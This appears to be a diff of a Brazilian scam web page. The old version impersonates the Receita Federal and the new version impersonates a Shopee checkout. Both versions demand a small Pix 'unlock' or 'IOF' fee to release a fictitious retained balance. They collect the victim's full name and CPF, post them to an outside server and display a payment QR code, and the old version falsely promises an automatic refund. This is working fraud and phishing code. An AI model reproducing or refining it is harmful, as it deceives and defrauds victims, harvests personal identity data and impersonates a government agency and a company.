@@ -1,112 +1,383 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Regularização IOF</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
-    
-    <style>
-        :root { --receita-blue: #0038a9; --green: #28a745; --bg-gray: #f8f9fa; --border: #e9ecef; --text-dark: #212529; }
-        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Inter', sans-serif; background-color: #fff; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; }
-        
-        /* HEADER AZUL OFICIAL RECEITA */
-        .app-header { 
-            width: 100%; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
-            background-color: var(--receita-blue); 
-            box-shadow: 0 4px 15px rgba(0,56,169,0.3); 
-            position: sticky; top: 0; z-index: 100; 
-            padding: 15px 0;
-        }
-        
-        .banner-img { 
-            height: 40px; 
-            display: block; 
-            filter: brightness(0) invert(1); /* Deixa o logo branco */
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Finalizar Pagamento</title>
+<style>
+    /* --- CSS FIEL AO DESIGN SHOPEE --- */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
 
-        .content { flex: 1; padding: 20px; display: flex; flex-direction: column; }
-        .title-hero { margin-bottom: 20px; text-align: center; }
-        .title-hero h1 { margin: 0 0 5px; font-size: 20px; color: var(--text-dark); letter-spacing: -0.5px; font-weight: 800; }
-        .title-hero p { margin: 0; font-size: 14px; color: #6c757d; }
-        
-        .summary-card { background: var(--bg-gray); border-radius: 12px; padding: 20px; margin-bottom: 20px; border: 1px solid var(--border); }
-        .row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #495057; }
-        .total-row { margin-top: 15px; padding-top: 15px; border-top: 1px dashed #ced4da; display: flex; justify-content: space-between; align-items: center; }
-        .total-value { font-size: 20px; font-weight: 800; color: var(--green); }
-        
-        .refund-notice { background: #e3f2fd; border: 1px solid #90caf9; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; color: #0d47a1; line-height: 1.4; }
-        
-        .input { width: 100%; padding: 16px; border: 1px solid #ced4da; border-radius: 8px; font-size: 16px; margin-bottom: 15px; }
-        .btn-main { width: 100%; padding: 18px; background: var(--green); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; text-transform: uppercase; cursor: pointer; margin-top: 10px; }
-        
-        #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 500; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
-        .qr-img { width: 200px; margin: 20px 0; border: 1px solid #eee; border-radius: 8px; }
-        .pix-code-box { background: #f8f9fa; padding: 12px; width: 100%; font-size: 11px; text-align: center; margin-bottom: 20px; border: 1px dashed #ccc; border-radius: 6px; color: #555; word-break: break-all; resize: none; height: 80px; }
-    </style>
+    /* Fundo da Página */
+    .background {
+        background: linear-gradient(135deg, #ee4d2d, #ff6a4d);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh; /* Ocupa tela toda */
+        padding: 20px;
+        width: 100%;
+    }
+
+    /* Cartão Branco Central */
+    .checkout-card {
+        background: #fff;
+        border-radius: 8px; /* Shopee usa bordas levemente arredondadas */
+        padding: 30px 25px;
+        width: 100%;
+        max-width: 420px;
+        margin: auto;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        position: relative;
+    }
+
+    /* Logo Shopee */
+    .logo {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        color: #ee4d2d;
+        font-weight: 700;
+        font-size: 24px;
+        margin-bottom: 25px;
+        letter-spacing: -0.5px;
+    }
+    .bag {
+        width: 36px;
+        height: 36px;
+        background: #ee4d2d;
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 6px;
+        font-size: 20px;
+    }
+
+    h2 {
+        font-size: 18px;
+        color: #333;
+        margin-bottom: 10px;
+        font-weight: 600;
+    }
+
+    .descricao {
+        font-size: 13px;
+        color: #666;
+        margin-bottom: 25px;
+        line-height: 1.5;
+    }
+
+    /* BARRA DE PROGRESSO */
+    .progress-section {
+        margin-bottom: 25px;
+    }
+    .progress-item {
+        display: flex;
+        justify-content: space-between;
+        font-size: 12px;
+        margin-bottom: 6px;
+        text-transform: uppercase;
+        font-weight: 600;
+    }
+    .status.complete { color: #28a745; }
+    .status.pending { color: #ee4d2d; }
+
+    .progress-bar {
+        height: 8px;
+        background: #f0f0f0;
+        border-radius: 10px;
+        overflow: hidden;
+        margin-bottom: 5px;
+    }
+    .progress-fill {
+        height: 100%;
+        width: 50%; /* Metade preenchido */
+        background: #ee4d2d;
+        border-radius: 10px;
+        animation: loadingBar 1s ease-in-out;
+    }
+    @keyframes loadingBar {
+        from { width: 0%; }
+        to { width: 50%; }
+    }
+
+    /* CAMPOS DE INPUT (Adicionados para o Pix funcionar) */
+    .input-group {
+        margin-bottom: 15px;
+        text-align: left;
+    }
+    .input-group label {
+        font-size: 12px;
+        font-weight: bold;
+        color: #333;
+        display: block;
+        margin-bottom: 5px;
+    }
+    .input-shopee {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 14px;
+        outline: none;
+        transition: border 0.3s;
+    }
+    .input-shopee:focus {
+        border-color: #ee4d2d;
+    }
+
+    /* RESUMO DE VALORES */
+    .resumo {
+        background: #fafafa;
+        border: 1px dashed #ddd;
+        border-radius: 6px;
+        padding: 15px;
+        margin-bottom: 25px;
+        margin-top: 10px;
+    }
+    .resumo-row {
+        display: flex;
+        justify-content: space-between;
+        font-size: 14px;
+        color: #555;
+        margin-bottom: 5px;
+    }
+    .resumo-row strong {
+        color: #333;
+    }
+    .total {
+        color: #ee4d2d;
+        font-size: 18px;
+        font-weight: bold;
+    }
+
+    /* BOTÃO CTA */
+    .cta {
+        width: 100%;
+        background: #ee4d2d;
+        color: white;
+        border: none;
+        padding: 16px;
+        font-size: 16px;
+        font-weight: bold;
+        border-radius: 4px;
+        cursor: pointer;
+        text-transform: uppercase;
+        box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3);
+        transition: all 0.3s;
+    }
+    .cta:hover {
+        background: #d73211;
+        transform: translateY(-2px);
+    }
+    .cta:disabled {
+        background: #ccc;
+        cursor: wait;
+        transform: none;
+        box-shadow: none;
+    }
+
+    .seguranca {
+        margin-top: 20px;
+        text-align: center;
+        font-size: 12px;
+        color: #888;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 5px;
+    }
+
+    /* ÁREA DO QR CODE (Escondida inicialmente) */
+    #pix_area {
+        display: none;
+        text-align: center;
+        margin-top: 20px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+        animation: fadeIn 0.5s;
+    }
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+    .copy-btn {
+        background: #fff;
+        border: 1px solid #ee4d2d;
+        color: #ee4d2d;
+        padding: 8px 15px;
+        border-radius: 4px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 10px;
+        font-size: 12px;
+    }
+</style>
 </head>
 <body>
-    <div class="app-header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" 
-             class="banner-img" 
-             alt="Receita Federal"
-             referrerpolicy="no-referrer">
-    </div>
 
-    <div class="content">
-        <div class="title-hero">
-            <h1>Liberação de Valores</h1>
-            <p>Regularize a taxa de IOF para receber.</p>
+<div class="background">
+    <div class="checkout-card">
+
+        <div class="logo">
+            <div class="bag">S</div>
+            <span>Shopee</span>
         </div>
-        <div class="summary-card">
-            <div class="row"><span>Saldo Retido</span><strong>R$ 1.489,38</strong></div>
-            <div class="row"><span>Taxa (IOF)</span><strong style="color: #dc3545;">R$ 47,90</strong></div>
-            <div class="total-row"><span style="font-weight:700;">Você paga agora:</span><span class="total-value">R$ 47,90</span></div>
+
+        <h2 id="titulo_card">Confirmação final do pedido</h2>
+
+        <p class="descricao" id="desc_card">
+            Seus dados foram verificados com sucesso. Para concluir a solicitação, confirme seus dados e finalize o pagamento abaixo.
+        </p>
+
+        <div class="progress-section" id="barra_progresso">
+            <div class="progress-item">
+                <span>Verificação de dados</span>
+                <span class="status complete">Concluído</span>
+            </div>
+
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+
+            <div class="progress-item">
+                <span>Pagamento</span>
+                <span class="status pending">Pendente</span>
+            </div>
         </div>
-        <div class="refund-notice"><strong>Reembolso Automático:</strong> Os R$ 47,90 retornam em 10 segundos.</div>
-        
-        <input type="text" id="nome" class="input" placeholder="Nome Completo">
-        <input type="tel" id="cpf" class="input" placeholder="CPF" maxlength="14" oninput="mask(this)">
-        
-        <button class="btn-main" onclick="gerarPixIOF()">PAGAR TAXA E LIBERAR</button>
-        <div style="text-align:center; margin-top:20px; color:#aaa; font-size:11px;">Banco Central do Brasil • Seguro SSL</div>
-    </div>
 
-    <div id="qr-screen">
-        <h3>Pagamento Seguro</h3>
-        <p style="color:#666;font-size:14px; text-align:center;">Abra o app do seu banco e escolha "Pix Copia e Cola".</p>
-        <img id="qr-image" class="qr-img">
-        <textarea id="pix-copia" class="pix-code-box" readonly></textarea>
-        <button class="btn-main" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
-        <div id="msg-sucesso" style="margin-top:20px;color:green;display:none;font-weight:bold;text-align:center;">PAGAMENTO APROVADO!</div>
-    </div>
+        <div id="form_inputs">
+            <div class="input-group">
+                <label>Nome Completo</label>
+                <input type="text" id="nome_cliente" class="input-shopee" placeholder="Digite seu nome">
+            </div>
+            <div class="input-group">
+                <label>CPF (Apenas números)</label>
+                <input type="tel" id="cpf_cliente" class="input-shopee" placeholder="000.000.000-00" maxlength="14">
+            </div>
+        </div>
 
-    <script>
-        const API_URL = "https://checkout-pix-profissional.onrender.com";
-        function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }
-        
-        async function gerarPixIOF() {
-            const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-main');
-            if(n.length<3||c.length<11) return alert("Preencha todos os dados.");
-            b.innerText="GERANDO PIX..."; b.disabled=true;
-            try {
-                const r=await fetch(`${API_URL}/pix`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:47.90,name:n,cpf:c})});
-                const d=await r.json();
-                if(d.point_of_interaction){
-                    document.getElementById('qr-image').src=`data:image/png;base64,${d.point_of_interaction.transaction_data.qr_code_base64}`;
-                    const codigoLimpo = d.point_of_interaction.transaction_data.qr_code.trim();
-                    document.getElementById('pix-copia').value = codigoLimpo;
-                    document.getElementById('qr-screen').style.display='flex';
-                    monitor(d.id);
-                } else { alert("Erro ao gerar Pix."); b.disabled=false; b.innerText="PAGAR TAXA E LIBERAR"; }
-            } catch(e){ alert("Erro de conexão."); b.disabled=false; b.innerText="PAGAR TAXA E LIBERAR"; }
+        <div class="resumo" id="resumo_compra">
+            <div class="resumo-row">
+                <span>Produto</span>
+                <strong>Taxa de Desbloqueio</strong>
+            </div>
+            <div class="resumo-row" style="margin-top:10px; padding-top:10px; border-top:1px solid #eee;">
+                <span>Total a pagar</span>
+                <strong class="total">R$ 27,90</strong>
+            </div>
+        </div>
+
+        <div id="pix_area">
+            <h3 style="color:#28a745; font-size:16px; margin-bottom:10px;">✅ QR Code Gerado!</h3>
+            <p style="font-size:12px; color:#555; margin-bottom:15px;">Escaneie para liberar seu saldo imediatamente.</p>
+            
+            <img id="img_qrcode" src="" style="width: 180px; height: 180px; display: block; margin: 0 auto; border: 1px solid #eee;">
+            
+            <div style="background: #f8f8f8; padding: 10px; border-radius: 4px; margin-top: 15px; word-break: break-all; font-size: 11px; color: #555;" id="txt_copia_cola">
+                ...
+            </div>
+            
+            <button class="copy-btn" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
+        </div>
+
+        <button class="cta" id="btn_finalizar">
+            Finalizar pagamento
+        </button>
+
+        <div class="seguranca">
+            🔒 Ambiente 100% seguro | Shopee Pay
+        </div>
+
+    </div>
+</div>
+
+<script>
+    // --- LÓGICA DO PIX (Backend Render + Frontend) ---
+    const btn = document.getElementById('btn_finalizar');
+    const pixArea = document.getElementById('pix_area');
+    const formInputs = document.getElementById('form_inputs');
+    const resumo = document.getElementById('resumo_compra');
+    const barra = document.getElementById('barra_progresso');
+    
+    // Máscara de CPF simples
+    document.getElementById('cpf_cliente').addEventListener('input', function(e) {
+        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,3})(\d{0,2})/);
+        e.target.value = !x[2] ? x[1] : x[1] + '.' + x[2] + (x[3] ? '.' + x[3] : '') + (x[4] ? '-' + x[4] : '');
+    });
+
+    btn.addEventListener('click', function() {
+        // 1. Pega dados
+        const nome = document.getElementById('nome_cliente').value.trim();
+        const cpf = document.getElementById('cpf_cliente').value.replace(/\D/g, ''); // Remove pontos/traços
+        const valor = "27.90"; // Valor fixo
+
+        // 2. Valida
+        if(nome.length < 3 || cpf.length < 11) {
+            alert("Por favor, preencha seu Nome e CPF corretamente.");
+            return;
         }
-        function monitor(id){ const i=setInterval(async()=>{ try{ const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); if(j.status==='approved'||j.status==='refunded'){ clearInterval(i); document.getElementById('msg-sucesso').style.display='block'; document.getElementById('qr-image').style.opacity=0.3; } }catch(e){} },3000); }
-        function copiarCodigo(){ const t=document.getElementById('pix-copia'); t.select(); document.execCommand('copy'); alert("CÓDIGO COPIADO!"); }
-    </script>
+
+        // 3. UI de Carregamento
+        const textoOriginal = btn.innerText;
+        btn.innerText = "PROCESSANDO...";
+        btn.disabled = true;
+
+        // 4. Chama API
+        fetch("https://checkout-pix-profissional.onrender.com/pix", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ name: nome, cpf: cpf, valor: valor })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if(data.success) {
+                // SUCESSO!
+                // Esconde formulário e botão, mostra Pix
+                formInputs.style.display = 'none';
+                resumo.style.display = 'none';
+                barra.style.display = 'none';
+                btn.style.display = 'none'; // Some o botão laranja
+                
+                // Preenche dados do Pix
+                document.getElementById('img_qrcode').src = data.encodedImage;
+                document.getElementById('txt_copia_cola').innerText = data.payload;
+                
+                // Mostra área do Pix
+                pixArea.style.display = 'block';
+                document.getElementById('titulo_card').innerText = "Pagamento Pendente";
+                document.getElementById('titulo_card').style.color = "#ee4d2d";
+                document.getElementById('desc_card').innerText = "Realize o pagamento para liberar o saldo instantaneamente.";
+
+                // Salva o código para copiar
+                window.codigoPix = data.payload;
+            } else {
+                alert("Erro ao gerar Pix: " + (data.message || "Tente novamente"));
+                btn.innerText = textoOriginal;
+                btn.disabled = false;
+            }
+        })
+        .catch(err => {
+            console.error(err);
+            alert("Erro de conexão com o servidor.");
+            btn.innerText = textoOriginal;
+            btn.disabled = false;
+        });
+    });
+
+    function copiarPix() {
+        if(window.codigoPix) {
+            navigator.clipboard.writeText(window.codigoPix);
+            alert("Código Copiado!");
+        }
+    }
+</script>
+
 </body>
 </html>
